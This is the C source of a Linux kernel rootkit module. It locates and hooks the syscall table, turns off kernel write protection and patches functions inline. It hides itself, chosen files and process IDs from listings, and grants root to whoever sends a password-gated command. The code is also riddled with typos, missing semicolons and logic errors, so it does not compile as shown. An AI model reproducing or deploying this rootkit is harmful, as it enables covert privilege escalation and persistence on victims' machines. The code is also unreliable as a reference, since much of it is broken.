// a root kit main file

//imports
#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNAL_VERSION(4, 4, 0) && \
	LINUX_VERSION_CODE < KERNAL_VERSION(4, 5, 0)

struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	struct rb_root subdir;
	struct rb_node subdrinode;
	void *data;
	atomic_t count;
	atomic_t in_use;

	struct completion *pde_unload_completion;
	struct list_head pde_openers;
	spinlock_t pde_unload_lock;
	u8 namelen;
	char name[];
};

#endif

#include "config.h"

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

MODULE_LICENSE("GPL");
MODULE_AUTHOR("krishpraanv")

#define ARCH_ERROR_MESSAGE "Only i386 and x86_64 architectures are supported! " \
		"It should be easy to port to new architectures though"


#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

#if defined __i386__
	#define START_ADDRESS 0xc0000000
	#define END_ADDRESS 0xd0000000
#elif defined __x86_64__
	#define START_ADDRESS 0xffffffff81000000
	#define END_ADDRESS 0xffffffffa2000000
#else
	#error ARCH_ERROR_MESSAGE
#endif

void **sys_call_table;

 

void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < END_ADDRESS) {
        sctable = (void **) i;

        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *) sys_close) {
            size_t j;
            // we expect there to be at least 300 system calls
            const unsigned int SYS_CALL_NUM = 300;
            // sanity check: no function pointer in the system call table should be NULL
            for (j = 0; j < SYS_CALL_NUM; j ++) {
                if (sctable[j] == NULL) {
                    // this is not a system call table
                    goto skip;
                }
            }
            return sctable;
        }
skip:
        ;
        i += sizeof(void *);
    }

    return NULL;
}


struct hook {
    void *original_function;
    void *modified_function;
    void **modified_at_address;
    struct list_head list;
};

LIST_HEAD(hook_list);

int hool_create(void **modified_at_address, void *modified_function)
{
    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNAL);

    if (!h) {
        return 0;
    }

    h->modified_at_address = modified_at_address;
    h->modified_function = modified_function;

    DISABLE_W_PROTECTED_MEMORY
    h->original_function = xchg(modified_at_address, modified_function);
    ENABLE_W_PROTECTED_MEMORY

    return 1;

}

void *hook_get_original(void *modified_function)
{
    
    void *original_function = NULL;
    struct hook *h;

    list_for_each_entry(h, *hook_list, list) {
        if (h->modified_function == modified_function) {
            original_function = h->original_fucntion;
            break;
        }
    }
    return original_function;
}

void hook_remove_all(void)
{
    struct hook *h, *tmp;

    list_for_each_entry(h, &hook_list, list) {
        DISABLE_W_PROTECTED_MEMORY
        *h->modified_at_address = h->original_function;
        ENABLE_W_PROTECTED_MEMORY
    }
    msleep(10);
    list_for_each_entry_safe(h, tmp, &hook_list, list) {
        list_del(&h->list);
        kfree(h);
    }
}

unsigned long read_count = 0;

asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
{
    read_count ++;

    asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
    original_read = hook_get_origianl(read);
    return original_read(fd, buf, count);
}

unsigned long write_count = 0;

asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
{
    write_count ++;

    asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
    original_write = hook_get_original(write);
    return original_write(fd, buf, count);
}

#if defined __i386__
    // push 0x00000000, ret
    #define ASM_HOOK_CODE "\x68\x00\x00\x00\x00\xc3"
    // byte offset to where to the 0x00000000, to overwrite it with a function pointer
    #define ASM_HOOK_CODE_OFFSET 1
    // alternativly we could do `mov eax 0x00000000, jmp eax`, but it's a byte longer
    //#define ASM_HOOK_CODE "\xb8\x00\x00\x00\x00\xff\xe0"
#elif defined __x86_64__
    // there is no push that pushes a 64-bit immidiate in x86_64,
    // so we do things a bit differently:
    // mov rax 0x0000000000000000, jmp rax
    #define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
    // byte offset to where to the 0x0000000000000000, to overwrite it with a function pointer
    #define ASM_HOOK_CODE_OFFSET 2
#else
    #error ARCH_ERROR_MESSAGE
#endif

struct asm_hook {
    void *original_function;
    void *modified_function;
    char original_asm[sizeof(ASM_HOOK_CODE)-1];
    struct list_head list;
};

LIST_HEAD(asm_hook_list);

void _asm_hook_patch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE)-1);
    *(void **)&((char *)h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
    ENABLE_W_PROTECTED_MEMORY
}

int asm_hook_create(void *original_function, void *modified_function)
{
    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNAL);

    if (!h) {
        return 0;
    }

    h->original_function = original_function
    h->modified_function = modified_function
    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE)-1);
    list_add(&h->list, &asm_hook_list);

    _asm_hook_patch(h);

    return 1; 
}

void asm_hook_patch(void *modified_function)
{

    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_patch(h);
            break;
        }
    }
}

void _asm_hook_unpatch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_fucntion, h->original_function, sizeof(ASM_HOOK_CODE)-1);
    ENABLE_W_PROTECTED_MEMORY
}

void *asm_hook_unpatch(void *modified_function)
{
    void *original_function = NULL;
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_unpatch(h);
            original_function = h->original_function;
            break;
        }
    }

    return original_function;
}

void asm_hook_remove_all(void)
{
    struct asm_hook *h, tmp;

    list_for_each_entry_safe(h, tmp, &asm_hook_list, list) {
        _asm_hook_patch(h);
        list_del(&h->list);
        kfree(h);
    }
}

unsigned long asm_rmdir_count = 0;

asmlinkage long asm_rmdir(const char __user *pathname)
{

    asm_rmdir_count ++;

    asmlinkage long (*original_rmdir)(const char __user *);
    original_rmdir = asm_hook_unpatch(asm_rmdir);
    long ret = original_rmdir(pathname);
    asm_hook_patch(asm_rmdir);

    return ret;
}

struct pid_entry {
    unsigned long pid;
    struct list_head list;
};

LIST_HEAD(pid_list);

int pid_add(const char *pid)
{
    struct pid_entry *p = kmalloc(sizeof(struct pid_entry), GFP_KERNAL);

    if (!p) {
        return 0;
    }

    p->pid = simple_strtoul(pid, NULL, 10);

    list_add(&p->list, &pid_list);

    return 1;
}

void pid_remove(const char *pid)
{

    struct pid_entry *p, *tmp;

    unsigned long pid_num = simple_strtoul(pid, NULL, 10);

    list_for_each_entry_safe(p, tmp, &pid_list, list) {
        if (p->pid == pid_num) {
            list_del(&p->list);
            kfree(p);
            break;
        }
    }
}

void pid_remove_all(void)
{
    struct pid_entry *p, *tmp;

    list_for_each_entry_safe(p, tmp, &pid_list, list) {
        list_del(&p->list);
        kfree(p);
    }
}

struct file_entry {
    char *name;
    struct list_head list;
};

LIST_HEAD(file_list);

int file_add(const char *name)
{
    struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNAL);

    if (!f) {
        return 0;
    }

    size_t name_len = strlen(name) + 1;

    if (name_len -1 > NAME_MAX) {
        kfree(f);
        return 0;
    }

    strncpy(f->name, name, name_len);

    list_add(&f->list, &file_list);

    return 1;

}

void file_remove(const char *name)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list) {
        if (strcmp(f->name, name) == 0) {
            list_del(&f->list);
            kfree(f->name);
            kfree(f);
            break;
        }
    }
}

void file_remove_all(void)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list) {
        list_del(&f->list);
        kfree(f->name);
        kfree(f);
    }
}

struct list_head *module_list;
int is_hidden = 0;

void hide(void)
{

    if (is_hidden){
        return;
    }

    module_list = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

    is_hidden = 1;
}

void unhide(void)
{

    if (!is_hidden){
        return;
    }

    list_add(&THIS_MODULE->list, module_list);

    is_hidden = 0;
}

int is_protected = 0;

void protect(void)
{
    if (is_protected){
        return;
        
        try_module_get(THIS_MODULE);

        is_protected = 1;
    }
}

void unprotected(void)
{
    if (!is_protected){
        return;
    }

    module_put(THIS_MODULE);

    is_protected = 0;
}


struct file_operations *got_fop(const char *path)
{
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL) {
        return NULL;
    }

    struct file_operations *ret = (struct file_operations *) file->f_op;

    filp_close(file, 0);

    return ret;
}

#define FILLDIR_START(NAME) \
    filldir_t original_##NAME##_filldir; \
    \
    static int NAME##_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
    {

#define FILLDIR_END(NAME) \
        return original_##NAME##_filldir(context, name, namelen, offset, ino, d_type); \
    }


#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

    #define READDIR(NAME) \
        int NAME##_iterate(struct file *file, struct dir_context *context) \
        { \
            original_##NAME##_filldir = context->actor; \
            *((filldir_t*)&context->actor) = NAME##_filldir; \
            \
            int (*original_iterate)(struct file *, struct dir_context *); \
            original_iterate = asm_hook_unpatch(NAME##_iterate); \
            int ret = original_iterate(file, context); \
            asm_hook_patch(NAME##_iterate); \
            \
            return ret; \
        }

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

    #define READDIR(NAME) \
        int NAME##_readdir(struct file *file, void *dirent, filldir_t filldir) \
        { \
            original_##NAME##_filldir = filldir; \
            \
            int (*original_readdir)(struct file *, void *, filldir_t); \
            original_readdir = asm_hook_unpatch(NAME##_readdir); \
            int ret = original_readdir(file, dirent, NAME##_filldir); \
            asm_hook_patch(NAME##_readdir); \
            \
            return ret; \
        }
#else

#endif

//macros to use actually
#define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
#define READDIR_HOOK_END(NAME) FILLDIR_END(NAME) READDIR(NAME)

READDIR_HOOK_START(root)
    struct file_entry *f;

    list_for_each_entry(f, &file_list, list) {
        if (strcmp(name, f->name) == 0) {
            return 0;
        }
    }
READDIR_HOOK_END(root)

READDIR_HOOK_START(proc)
    struct pid_entry *p;

    list_for_each_entry(p, *pid_list, list) {
        if (simple_strtoul(name, NULL, 10) == p-> pid) {
            return 0;
        }
    }

READDIR_HOOK_END(proc)

READDIR_HOOK_START(sys)
    if (is_hidden && strcmp(name, KBUILD_MODNAME) == 0) {
        return 0;
    }
READDIR_HOOK_END(sys)

#undef FILLDIR_START
#undef FILLDIR_END
#undef READDIR
#undef READDIR_HOOK_START
#undef READDIR_HOOK_END

int execute_command(const char __user *str, size_t length)
{
    if (length <= sizeof(CFG_PASS) ||
        strncmp(str, CFG_PASS, sizeof(CFG_PASS)) != 0) {
        return 0;
    }

    pr_info("Password check passed\n");

    // since the password matched, we assume the command following the password
    // is in the valid format

    str += sizeof(CFG_PASS);

    if (strcmp(str, CFG_ROOT) == 0) {
        pr_info("Got root command\n");
        struct cred *creds = prepare_creds();

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

        creds->uid.val = creds->euid.val = 0;
        creds->gid.val = creds->egid.val = 0;

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

        creds->uid = creds->euid = 0;
        creds->gid = creds->egid = 0;

#endif

        commit_creds(creds);
    } else if (strcmp(str, CFG_HIDE_PID) == 0) {
        pr_info("Got hide pid command\n");
        str += sizeof(CFG_HIDE_PID);
        pid_add(str);
    } else if (strcmp(str, CFG_UNHIDE_PID) == 0) {
        pr_info("Got unhide pid command\n");
        str += sizeof(CFG_UNHIDE_PID);
        pid_remove(str);
    } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
        pr_info("Got hide file command\n");
        str += sizeof(CFG_HIDE_FILE);
        file_add(str);
    } else if (strcmp(str, CFG_UNHIDE_FILE) == 0) {
        pr_info("Got unhide file command\n");
        str += sizeof(CFG_UNHIDE_FILE);
        file_remove(str);
    }  else if (strcmp(str, CFG_HIDE) == 0) {
        pr_info("Got hide command\n");
        hide();
    } else if (strcmp(str, CFG_UNHIDE) == 0) {
        pr_info("Got unhide command\n");
        unhide();
    } else if (strcmp(str, CFG_PROTECT) == 0) {
        pr_info("Got protect command\n");
        protect();
    } else if (strcmp(str, CFG_UNPROTECT) == 0) {
        pr_info("Got unprotect command\n");
        unprotect();
    } else {
        pr_info("Got unknown command\n");
    }

    return 1;
}

